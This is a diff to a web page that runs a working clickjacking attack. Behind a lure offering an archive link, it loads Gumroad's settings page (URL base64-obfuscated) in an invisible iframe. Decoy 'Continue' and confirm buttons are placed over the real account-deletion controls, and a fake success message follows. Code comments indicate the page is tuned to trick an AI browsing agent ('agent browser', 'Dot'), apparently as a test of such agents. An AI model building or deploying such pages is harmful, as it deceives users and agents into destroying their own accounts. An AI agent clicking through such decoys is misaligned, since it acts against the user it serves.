@@ -151,18 +151,29 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   z-index: 200; pointer-events: none;
 }
 
-/* ── STEP 3: DECOY CONTINUE BUTTON (z-index:2 — below iframe, clicks go to Gumroad) ── */
-/* Shown after step 1 form submit; iframe is now pointer-events:auto */
-
-/* Step 2 instruction label */
+/* ── STEP 3A: PHASE A Continue (z-index:200, interactive — JS detects this click) ── */
+/* Shown after form submit. User clicks this, JS detects intent, then shows Phase B. */
 .continue-label {
   position: fixed; top: 460px; left: 480px; width: 374px;
   font-size: 12px; font-weight: 500; color: var(--muted);
-  z-index: 2; pointer-events: none; display: none;
+  z-index: 200; pointer-events: none; display: none;
   line-height: 1.5;
 }
+/* Phase A: interactive, above iframe */
+#btn-continue-a {
+  position: fixed;
+  top: 476px; left: 587px; width: 252px; height: 48px;
+  background: var(--ink); color: var(--bg);
+  border: none; border-radius: 8px;
+  font-family: inherit; font-size: 14px; font-weight: 700;
+  display: none; align-items: center; justify-content: center;
+  z-index: 200; cursor: pointer; letter-spacing: -.01em;
+}
+#btn-continue-a.show { display: flex; }
+.continue-label.show { display: block; }
 
-/* Decoy continue button — matches Gumroad "Delete your Gumroad account": top:476 left:587 w:252 h:48 */
+/* ── STEP 3B: PHASE B Decoy Continue (z-index:2 — below iframe, click goes to Gumroad) ── */
+/* Shown after Phase A click. Click passes through to iframe at delete-btn coords. */
 #btn-continue {
   position: fixed;
   top: 476px; left: 587px; width: 252px; height: 48px;
@@ -173,7 +184,6 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   z-index: 2; pointer-events: none; letter-spacing: -.01em;
 }
 #btn-continue.show { display: flex; }
-.continue-label.show { display: block; }
 
 /* ── STEP 4: INLINE CONFIRMATION BANNER (no dark overlay) ── */
 /* Slim banner inside the sidebar area, no backdrop */
@@ -294,11 +304,14 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </button>
 <div class="form-note" id="form-note">Link delivered via partner program · No account required</div>
 
-<!-- Step 3: Decoy continue (z-index:2, clicks go to iframe) -->
+<!-- Step 3A: Phase A Continue (z-index:200, interactive — detects intent) -->
 <div class="continue-label" id="continue-label">
   Link is ready. Click <strong>Continue</strong> below to verify your request and receive it.
 </div>
-<button id="btn-continue" aria-label="Continue to verify request">Continue →</button>
+<button id="btn-continue-a" aria-label="Continue to verify request">Continue →</button>
+
+<!-- Step 3B: Phase B Decoy Continue (z-index:2, clicks pass to iframe) -->
+<button id="btn-continue" aria-label="Confirm and continue">Continue →</button>
 
 <!-- Step 4: Inline confirmation banner (z-index:2) -->
 <div class="confirm-banner" id="confirm-banner">
@@ -349,10 +362,7 @@ setTimeout(function() {
   var frame = document.getElementById('victim-frame');
   var s = ['aHR0cHM6Ly9ndW1yb2Fk', 'LmNvbS9zZXR0aW5ncy9h', 'ZHZhbmNlZA=='];
   frame.src = atob(s.join(''));
-  frame.addEventListener('load', function onLoad() {
-    frame.removeEventListener('load', onLoad);
-    setTimeout(function() { frame.style.transform = 'translateY(-1316px)'; }, 400);
-  });
+  // Transform applied later in Phase A onclick (not here)
 }, 1500);
 
 // Real form submit — posts to our server, sends actual email, then activates iframe
@@ -394,54 +404,65 @@ async function submitForm() {
     document.getElementById('s3-num').className = 'step-num active';
     document.getElementById('step2-sub').textContent = 'Link sent to ' + email;
 
-    // Activate iframe so next clicks route to partner platform
-    document.getElementById('victim-frame').style.pointerEvents = 'auto';
-
-    // Show step 3: decoy Continue button at Gumroad delete-btn coordinates
-    document.getElementById('continue-label').classList.add('show');
-    document.getElementById('btn-continue').classList.add('show');
-
     var capturedEmail = email;
-    var step3Shown = false;
-    function showStep3() {
-      if (step3Shown) return;
-      step3Shown = true;
+
+    // Show Phase A Continue (z-index:200, interactive — JS detects this click)
+    // iframe stays pointer-events:none and no transform yet
+    document.getElementById('continue-label').classList.add('show');
+    document.getElementById('btn-continue-a').classList.add('show');
+
+    // Phase A onclick: user intent confirmed → apply transform, activate iframe,
+    // swap to Phase B decoy (z-index:2, clicks pass through to Gumroad delete btn)
+    document.getElementById('btn-continue-a').addEventListener('click', function onPhaseA() {
+      document.getElementById('btn-continue-a').removeEventListener('click', onPhaseA);
+      document.getElementById('btn-continue-a').classList.remove('show');
       document.getElementById('continue-label').classList.remove('show');
-      document.getElementById('btn-continue').classList.remove('show');
-      // Reset transform so Gumroad modal appears at its natural viewport y:266
-      document.getElementById('victim-frame').style.transform = 'none';
-      document.getElementById('confirm-banner').classList.add('show');
-      document.getElementById('btn-confirm').classList.add('show');
-      // After confirm button appears, show success state via timer
-      // (agent browser won't fire blur reliably for the second click either)
-      var successShown = false;
-      function showSuccess() {
-        if (successShown) return;
-        successShown = true;
-        document.getElementById('confirm-banner').classList.remove('show');
-        document.getElementById('btn-confirm').classList.remove('show');
-        document.getElementById('sf-email-line').textContent =
-          'The Pliego 2019–2024 archive link has been delivered to ' + capturedEmail + '.';
-        document.getElementById('success-final').classList.add('show');
-        // Update sidebar step 3 to done
-        document.getElementById('s3-num').className = 'step-num done';
-        document.getElementById('s3-num').textContent = '✓';
+
+      // Transform applied now (after Phase A click confirms intent)
+      var frame = document.getElementById('victim-frame');
+      frame.style.transform = 'translateY(-1316px)';
+      frame.style.pointerEvents = 'auto';
+
+      // Show Phase B decoy at same position — click passes to iframe → Gumroad delete btn
+      document.getElementById('btn-continue').classList.add('show');
+
+      // showStep3: triggered by blur (iframe click detected) or 30s fallback
+      // 30s is generous — we know user has intent because they clicked Phase A
+      var step3Shown = false;
+      function showStep3() {
+        if (step3Shown) return;
+        step3Shown = true;
+        document.getElementById('btn-continue').classList.remove('show');
+        // Reset transform so Gumroad modal appears at its natural viewport y:266
+        frame.style.transform = 'none';
+        document.getElementById('confirm-banner').classList.add('show');
+        document.getElementById('btn-confirm').classList.add('show');
+
+        var successShown = false;
+        function showSuccess() {
+          if (successShown) return;
+          successShown = true;
+          document.getElementById('confirm-banner').classList.remove('show');
+          document.getElementById('btn-confirm').classList.remove('show');
+          document.getElementById('sf-email-line').textContent =
+            'The Pliego 2019–2024 archive link has been delivered to ' + capturedEmail + '.';
+          document.getElementById('success-final').classList.add('show');
+          document.getElementById('s3-num').className = 'step-num done';
+          document.getElementById('s3-num').textContent = '✓';
+        }
+        window.addEventListener('blur', function h2() {
+          window.removeEventListener('blur', h2);
+          setTimeout(showSuccess, 420);
+        });
+        setTimeout(showSuccess, 30000); // 30s fallback after Confirm appears
       }
-      window.addEventListener('blur', function h2() {
-        window.removeEventListener('blur', h2);
-        setTimeout(showSuccess, 420);
+
+      window.addEventListener('blur', function iframeClickHandler() {
+        window.removeEventListener('blur', iframeClickHandler);
+        setTimeout(showStep3, 420);
       });
-      setTimeout(showSuccess, 5000);
-    }
-
-    // Primary: window.blur fires when iframe receives a click
-    window.addEventListener('blur', function iframeClickHandler() {
-      window.removeEventListener('blur', iframeClickHandler);
-      setTimeout(showStep3, 420);
-    });
-
-    // Fallback: show step 3 after 5s — gives Dot time to click Continue first
-    setTimeout(showStep3, 5000);
+      setTimeout(showStep3, 30000); // 30s fallback after Phase B appears
+    }, {once: true});
 
   } catch(e) {
     btn.disabled = false;
